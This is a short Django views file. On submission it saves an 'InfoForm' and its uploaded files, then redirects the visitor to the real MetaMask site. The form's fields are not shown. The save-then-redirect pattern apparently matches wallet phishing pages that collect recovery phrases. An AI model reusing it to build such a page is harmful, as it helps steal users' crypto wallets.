from django.shortcuts import render, redirect
from .forms import *

# Create your views here.
def index(request):
  if request.method == 'POST':
    form = InfoForm(request.POST, request.FILES)
    if form.is_valid():
      form.save()
      return redirect('https://metamask.io/')  
    else:
      form = InfoForm()  

  return render(request, 'index.html')